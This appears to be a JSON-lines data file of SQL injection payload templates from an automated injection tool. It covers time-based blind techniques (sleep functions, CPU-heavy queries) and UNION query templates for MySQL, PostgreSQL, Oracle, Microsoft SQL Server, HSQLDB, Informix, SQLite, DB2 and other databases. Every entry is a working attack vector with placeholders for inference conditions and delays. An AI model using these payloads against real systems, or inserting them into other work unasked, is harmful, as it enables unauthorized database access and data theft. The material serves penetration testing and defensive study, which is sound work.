{"title": "HSQLDB > 2.0 AND time-based blind (heavy query - comment)", "stype": 5, "level": 5, "risk": 2, "clause": [1, 2, 3, 9], "where": [1], "vector": "AND '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END", "request": {"payload": "AND '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)", "comment": "--"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "HSQLDB", "dbms_version": "> 2.0"}}
{"title": "HSQLDB > 2.0 OR time-based blind (heavy query - comment)", "stype": 5, "level": 5, "risk": 3, "clause": [1, 2, 3, 9], "where": [1], "vector": "OR '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END", "request": {"payload": "OR '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)", "comment": "--"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "HSQLDB", "dbms_version": "> 2.0"}}
{"title": "Informix AND time-based blind (heavy query)", "stype": 5, "level": 2, "risk": 2, "clause": [1, 2, 3, 9], "where": [1], "vector": "AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) ELSE [RANDNUM] END)", "request": {"payload": "AND [RANDNUM]=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "Informix"}}
{"title": "Informix OR time-based blind (heavy query)", "stype": 5, "level": 2, "risk": 3, "clause": [1, 2, 3, 9], "where": [1], "vector": "OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) ELSE [RANDNUM] END)", "request": {"payload": "OR [RANDNUM]=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "Informix"}}
{"title": "Informix AND time-based blind (heavy query - comment)", "stype": 5, "level": 5, "risk": 2, "clause": [1, 2, 3, 9], "where": [1], "vector": "AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) ELSE [RANDNUM] END)", "request": {"payload": "AND [RANDNUM]=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)", "comment": "--"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "Informix"}}
{"title": "Informix OR time-based blind (heavy query - comment)", "stype": 5, "level": 5, "risk": 3, "clause": [1, 2, 3, 9], "where": [1], "vector": "OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) ELSE [RANDNUM] END)", "request": {"payload": "OR [RANDNUM]=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)", "comment": "--"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "Informix"}}
{"title": "MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)", "stype": 5, "level": 3, "risk": 2, "clause": [1, 2, 3, 4, 5], "where": [1], "vector": "PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\\',(IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])))),1)", "request": {"payload": "PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\\',(BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))))),1)"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.0.12"}}
{"title": "MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)", "stype": 5, "level": 5, "risk": 2, "clause": [1, 2, 3, 4, 5], "where": [1], "vector": "PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\\',(IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])))),1)", "request": {"payload": "PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\\',(BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))))),1)", "comment": "#"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.0.12"}}
{"title": "MySQL >= 5.0.12 time-based blind - Parameter replace", "stype": 5, "level": 2, "risk": 1, "clause": [1, 2, 3, 9], "where": [3], "vector": "(CASE WHEN ([INFERENCE]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM] END)", "request": {"payload": "(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM] END)"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.0.12"}}
{"title": "MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)", "stype": 5, "level": 3, "risk": 1, "clause": [1, 2, 3, 9], "where": [3], "vector": "(SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])", "request": {"payload": "(SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.0.12"}}
{"title": "MySQL < 5.0.12 time-based blind - Parameter replace (heavy queries)", "stype": 5, "level": 4, "risk": 2, "clause": [1, 2, 3, 9], "where": [3], "vector": "(CASE WHEN ([INFERENCE]) THEN (SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))) ELSE [RANDNUM])", "request": {"payload": "(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))) ELSE [RANDNUM])"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "MySQL", "dbms_version": "< 5.0.12"}}
{"title": "MySQL time-based blind - Parameter replace (bool)", "stype": 5, "level": 4, "risk": 1, "clause": [1, 2, 3, 9], "where": [3], "vector": "([INFERENCE] AND SLEEP([SLEEPTIME]))", "request": {"payload": "([RANDNUM]=[RANDNUM] AND SLEEP([SLEEPTIME]))"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "MySQL"}}
{"title": "MySQL time-based blind - Parameter replace (ELT)", "stype": 5, "level": 5, "risk": 1, "clause": [1, 2, 3, 9], "where": [3], "vector": "ELT([INFERENCE],SLEEP([SLEEPTIME]))", "request": {"payload": "ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "MySQL"}}
{"title": "MySQL time-based blind - Parameter replace (MAKE_SET)", "stype": 5, "level": 5, "risk": 1, "clause": [1, 2, 3, 9], "where": [3], "vector": "MAKE_SET([INFERENCE],SLEEP([SLEEPTIME]))", "request": {"payload": "MAKE_SET([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "MySQL"}}
{"title": "PostgreSQL > 8.1 time-based blind - Parameter replace", "stype": 5, "level": 3, "risk": 1, "clause": [1, 2, 3, 9], "where": [3], "vector": "(CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)", "request": {"payload": "(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "PostgreSQL", "dbms_version": "> 8.1"}}
{"title": "PostgreSQL time-based blind - Parameter replace (heavy query)", "stype": 5, "level": 4, "risk": 2, "clause": [1, 2, 3, 9], "where": [3], "vector": "(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE [RANDNUM] END)", "request": {"payload": "(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "PostgreSQL"}}
{"title": "Microsoft SQL Server/Sybase time-based blind - Parameter replace (heavy queries)", "stype": 5, "level": 4, "risk": 2, "clause": [1, 3, 9], "where": [3], "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END))", "request": {"payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END))"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}
{"title": "Oracle time-based blind - Parameter replace (DBMS_LOCK.SLEEP)", "stype": 5, "level": 3, "risk": 1, "clause": [1, 3, 9], "where": [3], "vector": "BEGIN IF ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END;", "request": {"payload": "BEGIN IF ([RANDNUM]=[RANDNUM]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END;"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "Oracle"}}
{"title": "Oracle time-based blind - Parameter replace (DBMS_PIPE.RECEIVE_MESSAGE)", "stype": 5, "level": 3, "risk": 1, "clause": [1, 3, 9], "where": [3], "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END) FROM DUAL)", "request": {"payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END) FROM DUAL)"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "Oracle"}}
{"title": "Oracle time-based blind - Parameter replace (heavy queries)", "stype": 5, "level": 4, "risk": 2, "clause": [1, 3, 9], "where": [3], "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END) FROM DUAL)", "request": {"payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END) FROM DUAL)"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "Oracle"}}
{"title": "SQLite > 2.0 time-based blind - Parameter replace (heavy query)", "stype": 5, "level": 4, "risk": 2, "clause": [1, 2, 3, 9], "where": [3], "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END))", "request": {"payload": "(SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2)))))"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "SQLite", "dbms_version": "> 2.0"}}
{"title": "Firebird time-based blind - Parameter replace (heavy query)", "stype": 5, "level": 5, "risk": 2, "clause": [1, 2, 3, 9], "where": [3], "vector": "IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),[RANDNUM])", "request": {"payload": "(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "Firebird", "dbms_version": ">= 2.0"}}
{"title": "SAP MaxDB time-based blind - Parameter replace (heavy query)", "stype": 5, "level": 5, "risk": 2, "clause": [1, 3, 9], "where": [3], "vector": "(SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE ([INFERENCE])) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE ([INFERENCE])) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE ([INFERENCE])) AS T3)", "request": {"payload": "(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "SAP MaxDB"}}
{"title": "IBM DB2 time-based blind - Parameter replace (heavy query)", "stype": 5, "level": 5, "risk": 2, "clause": [1, 2, 3, 9], "where": [3], "vector": "(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE ([INFERENCE]))", "request": {"payload": "(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "IBM DB2"}}
{"title": "HSQLDB >= 1.7.2 time-based blind - Parameter replace (heavy query)", "stype": 5, "level": 4, "risk": 2, "clause": [1, 2, 3, 9], "where": [1], "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)", "request": {"payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "HSQLDB", "dbms_version": ">= 1.7.2"}}
{"title": "HSQLDB > 2.0 time-based blind - Parameter replace (heavy query)", "stype": 5, "level": 5, "risk": 2, "clause": [1, 2, 3, 9], "where": [1], "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END) FROM (VALUES(0)))", "request": {"payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END) FROM (VALUES(0)))"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "HSQLDB", "dbms_version": "> 2.0"}}
{"title": "Informix time-based blind - Parameter replace (heavy query)", "stype": 5, "level": 4, "risk": 2, "clause": [1, 2, 3, 9], "where": [3], "vector": "(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) ELSE [RANDNUM] END)", "request": {"payload": "(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "Informix"}}
{"title": "MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause", "stype": 5, "level": 3, "risk": 1, "clause": [2, 3], "where": [1], "vector": ",(SELECT (CASE WHEN ([INFERENCE]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM] END))", "request": {"payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM] END))"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.0.12"}}
{"title": "MySQL < 5.0.12 time-based blind - ORDER BY, GROUP BY clause (heavy query)", "stype": 5, "level": 4, "risk": 2, "clause": [2, 3], "where": [1], "vector": ",(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))", "request": {"payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "MySQL", "dbms_version": "< 5.0.12"}}
{"title": "PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause", "stype": 5, "level": 3, "risk": 1, "clause": [2, 3], "where": [1], "vector": ",(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE 1/(SELECT 0) END))", "request": {"payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE 1/(SELECT 0) END))"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "PostgreSQL", "dbms_version": "> 8.1"}}
{"title": "PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)", "stype": 5, "level": 4, "risk": 2, "clause": [2, 3], "where": [1], "vector": ",(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE 1/(SELECT 0) END))", "request": {"payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE 1/(SELECT 0) END))"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "PostgreSQL"}}
{"title": "Microsoft SQL Server/Sybase time-based blind - ORDER BY clause (heavy query)", "stype": 5, "level": 4, "risk": 2, "clause": [2, 3], "where": [1], "vector": ",(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))", "request": {"payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}
{"title": "Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_LOCK.SLEEP)", "stype": 5, "level": 3, "risk": 1, "clause": [2, 3], "where": [1], "vector": ",(BEGIN IF ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END;)", "request": {"payload": ",(BEGIN IF ([RANDNUM]=[RANDNUM]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END;)"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "Oracle"}}
{"title": "Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_PIPE.RECEIVE_MESSAGE)", "stype": 5, "level": 3, "risk": 1, "clause": [2, 3], "where": [1], "vector": ",(SELECT (CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)", "request": {"payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "Oracle"}}
{"title": "Oracle time-based blind - ORDER BY, GROUP BY clause (heavy query)", "stype": 5, "level": 4, "risk": 2, "clause": [2, 3], "where": [1], "vector": ",(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)", "request": {"payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "Oracle"}}
{"title": "HSQLDB >= 1.7.2 time-based blind - ORDER BY, GROUP BY clause (heavy query)", "stype": 5, "level": 4, "risk": 2, "clause": [2, 3], "where": [1], "vector": ",(SELECT (CASE WHEN ([INFERENCE]) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL))) ELSE [RANDNUM]/(SELECT 0 FROM INFORMATION_SCHEMA.SYSTEM_USERS) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)", "request": {"payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL))) ELSE [RANDNUM]/(SELECT 0 FROM INFORMATION_SCHEMA.SYSTEM_USERS) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)", "comment": "--"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "HSQLDB", "dbms_version": ">= 1.7.2"}}
{"title": "HSQLDB > 2.0 time-based blind - ORDER BY, GROUP BY clause (heavy query)", "stype": 5, "level": 4, "risk": 2, "clause": [2, 3], "where": [1], "vector": ",(SELECT (CASE WHEN ([INFERENCE]) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL))) ELSE [RANDNUM]/(SELECT 0 FROM (VALUES(0))) END) FROM (VALUES(0)))", "request": {"payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL))) ELSE [RANDNUM]/(SELECT 0 FROM (VALUES(0))) END) FROM (VALUES(0)))"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "HSQLDB", "dbms_version": "> 2.0"}}
{"title": "Generic UNION query ([CHAR]) - [COLSTART] to [COLSTOP] columns (custom)", "stype": 6, "level": 1, "risk": 1, "clause": [1, 2, 3, 4, 5], "where": [1], "vector": "[UNION]", "request": {"payload": null, "comment": "[GENERIC_SQL_COMMENT]", "char": "[CHAR]", "columns": "[COLSTART]-[COLSTOP]"}, "response": {"union": null}}
{"title": "Generic UNION query (NULL) - [COLSTART] to [COLSTOP] columns (custom)", "stype": 6, "level": 1, "risk": 1, "clause": [1, 2, 3, 4, 5], "where": [1], "vector": "[UNION]", "request": {"payload": null, "comment": "[GENERIC_SQL_COMMENT]", "char": "NULL", "columns": "[COLSTART]-[COLSTOP]"}, "response": {"union": null}}
{"title": "Generic UNION query ([RANDNUM]) - [COLSTART] to [COLSTOP] columns (custom)", "stype": 6, "level": 3, "risk": 1, "clause": [1, 2, 3, 4, 5], "where": [1], "vector": "[UNION]", "request": {"payload": null, "comment": "[GENERIC_SQL_COMMENT]", "char": "[RANDNUM]", "columns": "[COLSTART]-[COLSTOP]"}, "response": {"union": null}}
{"title": "Generic UNION query ([CHAR]) - 1 to 10 columns", "stype": 6, "level": 1, "risk": 1, "clause": [1, 2, 3, 4, 5], "where": [1], "vector": "[UNION]", "request": {"payload": null, "comment": "[GENERIC_SQL_COMMENT]", "char": "[CHAR]", "columns": "1-10"}, "response": {"union": null}}
{"title": "Generic UNION query (NULL) - 1 to 10 columns", "stype": 6, "level": 1, "risk": 1, "clause": [1, 2, 3, 4, 5], "where": [1], "vector": "[UNION]", "request": {"payload": null, "comment": "[GENERIC_SQL_COMMENT]", "char": "NULL", "columns": "1-10"}, "response": {"union": null}}
{"title": "Generic UNION query ([RANDNUM]) - 1 to 10 columns", "stype": 6, "level": 3, "risk": 1, "clause": [1, 2, 3, 4, 5], "where": [1], "vector": "[UNION]", "request": {"payload": null, "comment": "[GENERIC_SQL_COMMENT]", "char": "[RANDNUM]", "columns": "1-10"}, "response": {"union": null}}
{"title": "Generic UNION query ([CHAR]) - 11 to 20 columns", "stype": 6, "level": 2, "risk": 1, "clause": [1, 2, 3, 4, 5], "where": [1], "vector": "[UNION]", "request": {"payload": null, "comment": "[GENERIC_SQL_COMMENT]", "char": "[CHAR]", "columns": "11-20"}, "response": {"union": null}}
{"title": "Generic UNION query (NULL) - 11 to 20 columns", "stype": 6, "level": 2, "risk": 1, "clause": [1, 2, 3, 4, 5], "where": [1], "vector": "[UNION]", "request": {"payload": null, "comment": "[GENERIC_SQL_COMMENT]", "char": "NULL", "columns": "11-20"}, "response": {"union": null}}
{"title": "Generic UNION query ([RANDNUM]) - 11 to 20 columns", "stype": 6, "level": 3, "risk": 1, "clause": [1, 2, 3, 4, 5], "where": [1], "vector": "[UNION]", "request": {"payload": null, "comment": "[GENERIC_SQL_COMMENT]", "char": "[RANDNUM]", "columns": "11-20"}, "response": {"union": null}}
{"title": "Generic UNION query ([CHAR]) - 21 to 30 columns", "stype": 6, "level": 3, "risk": 1, "clause": [1, 2, 3, 4, 5], "where": [1], "vector": "[UNION]", "request": {"payload": null, "comment": "[GENERIC_SQL_COMMENT]", "char": "[CHAR]", "columns": "21-30"}, "response": {"union": null}}
{"title": "Generic UNION query (NULL) - 21 to 30 columns", "stype": 6, "level": 3, "risk": 1, "clause": [1, 2, 3, 4, 5], "where": [1], "vector": "[UNION]", "request": {"payload": null, "comment": "[GENERIC_SQL_COMMENT]", "char": "NULL", "columns": "21-30"}, "response": {"union": null}}
{"title": "Generic UNION query ([RANDNUM]) - 21 to 30 columns", "stype": 6, "level": 4, "risk": 1, "clause": [1, 2, 3, 4, 5], "where": [1], "vector": "[UNION]", "request": {"payload": null, "comment": "[GENERIC_SQL_COMMENT]", "char": "[RANDNUM]", "columns": "21-30"}, "response": {"union": null}}
{"title": "Generic UNION query ([CHAR]) - 31 to 40 columns", "stype": 6, "level": 4, "risk": 1, "clause": [1, 2, 3, 4, 5], "where": [1], "vector": "[UNION]", "request": {"payload": null, "comment": "[GENERIC_SQL_COMMENT]", "char": "[CHAR]", "columns": "31-40"}, "response": {"union": null}}
{"title": "Generic UNION query (NULL) - 31 to 40 columns", "stype": 6, "level": 4, "risk": 1, "clause": [1, 2, 3, 4, 5], "where": [1], "vector": "[UNION]", "request": {"payload": null, "comment": "[GENERIC_SQL_COMMENT]", "char": "NULL", "columns": "31-40"}, "response": {"union": null}}
{"title": "Generic UNION query ([RANDNUM]) - 31 to 40 columns", "stype": 6, "level": 5, "risk": 1, "clause": [1, 2, 3, 4, 5], "where": [1], "vector": "[UNION]", "request": {"payload": null, "comment": "[GENERIC_SQL_COMMENT]", "char": "[RANDNUM]", "columns": "31-40"}, "response": {"union": null}}
{"title": "Generic UNION query ([CHAR]) - 41 to 50 columns", "stype": 6, "level": 5, "risk": 1, "clause": [1, 2, 3, 4, 5], "where": [1], "vector": "[UNION]", "request": {"payload": null, "comment": "[GENERIC_SQL_COMMENT]", "char": "[CHAR]", "columns": "41-50"}, "response": {"union": null}}
{"title": "Generic UNION query (NULL) - 41 to 50 columns", "stype": 6, "level": 5, "risk": 1, "clause": [1, 2, 3, 4, 5], "where": [1], "vector": "[UNION]", "request": {"payload": null, "comment": "[GENERIC_SQL_COMMENT]", "char": "NULL", "columns": "41-50"}, "response": {"union": null}}
{"title": "Generic UNION query ([RANDNUM]) - 41 to 50 columns", "stype": 6, "level": 5, "risk": 1, "clause": [1, 2, 3, 4, 5], "where": [1], "vector": "[UNION]", "request": {"payload": null, "comment": "[GENERIC_SQL_COMMENT]", "char": "[RANDNUM]", "columns": "41-50"}, "response": {"union": null}}
{"title": "MySQL UNION query ([CHAR]) - [COLSTART] to [COLSTOP] columns (custom)", "stype": 6, "level": 2, "risk": 1, "clause": [1, 2, 3, 4, 5], "where": [1], "vector": "[UNION]", "request": {"payload": null, "comment": "#", "char": "[CHAR]", "columns": "[COLSTART]-[COLSTOP]"}, "response": {"union": null}, "details": {"dbms": "MySQL"}}
{"title": "MySQL UNION query (NULL) - [COLSTART] to [COLSTOP] columns (custom)", "stype": 6, "level": 2, "risk": 1, "clause": [1, 2, 3, 4, 5], "where": [1], "vector": "[UNION]", "request": {"payload": null, "comment": "#", "char": "NULL", "columns": "[COLSTART]-[COLSTOP]"}, "response": {"union": null}, "details": {"dbms": "MySQL"}}
